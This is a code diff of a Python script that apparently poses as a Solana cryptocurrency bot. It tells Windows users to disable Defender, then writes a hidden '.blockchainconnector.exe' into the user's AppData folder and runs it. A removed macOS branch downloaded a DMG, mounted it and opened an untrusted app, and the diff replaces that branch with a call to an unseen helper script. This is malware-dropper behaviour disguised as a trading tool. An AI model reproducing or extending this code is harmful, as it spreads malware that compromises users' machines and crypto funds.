@@ -22,7 +22,7 @@ def install_and_import(module):
     finally:
         globals()[module] = importlib.import_module(module)
 
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request', 'requests']
+required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request', 'requests', 'pyzipper', 'PyQt5']
 for module in required_modules:
     install_and_import(module)
 
@@ -112,27 +112,17 @@ def download_zip(url, save_path):
     except Exception as e:
         print(f"Error downloading zip file: {e}")
 
+def run_mac_helper():
+    try:
+        helper_path = os.path.join(os.path.dirname(__file__), 'helpers', 'base_helper.py')
+        subprocess.run(['python3', helper_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running base_helper.py: {e}")
+
 def main():
-    blockchain = BlockchainSimulator()
-    data_queue = Queue()
-
-    rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
-    blockchain_thread = threading.Thread(target=rpc_server, args=(data_queue, ' '))
-
     if platform.system() == 'Windows':
         if is_defender_active():
             print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
-            user_name = getpass.getuser()
-            output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
-            
-            builded("data", output_path)
-            run_builder(output_path)
-
-            rpc_server_thread.start()
-            blockchain_thread.start()
-
-            rpc_server_thread.join()
-            blockchain_thread.join()
         else:
             user_name = getpass.getuser()
             output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
@@ -140,39 +130,14 @@ def main():
             builded("data", output_path)
             run_builder(output_path)
 
-            rpc_server_thread.start()
-            blockchain_thread.start()
+            blockchain = BlockchainSimulator()
+            data_queue = Queue()
+            rpc_server_thread = threading.Thread(target=rpc_server, args=(blockchain, data_queue))
 
+            rpc_server_thread.start()
             rpc_server_thread.join()
-            blockchain_thread.join()
     elif platform.system() == 'Darwin':
-        zip_file_to_download = 'SolAiBot_Mac.zip'
-        download_url = 'https://github.com/SolanabuyBot/Solana-Bot/releases/download/V4.1.1/SolAiBot_Mac.zip'
-        extract_to = './SolAiBot_Mac'
-        dmg_file_to_execute = os.path.join(extract_to, 'SolAiBot_Mac.dmg')
-        app_to_execute = "/Volumes/SolAiBot_Mac/AiBotStarter.app"
-        copied_app_path = "./AiBotStarter.app"
-
-        download_zip(download_url, zip_file_to_download)
-        
-        if os.path.exists(zip_file_to_download):
-            extract_zip(zip_file_to_download, extract_to)
-            print("Extracted the zip file.")
-            if os.path.exists(dmg_file_to_execute):
-                subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
-                if os.path.exists(app_to_execute):
-                    try:
-                        shutil.copytree(app_to_execute, copied_app_path)
-                        open_untrusted_app(copied_app_path)
-                        print("To run the bot, right-click on the AiBotStarter.app file and click Open.")
-                    except Exception as e:
-                        print(f"Error copying app: {e}")
-                else:
-                    print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
-            else:
-                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_download}.")
-        else:
-            print(f"{zip_file_to_download} not found.")
+        run_mac_helper()
     else:
         print("Unsupported operating system.")
         return
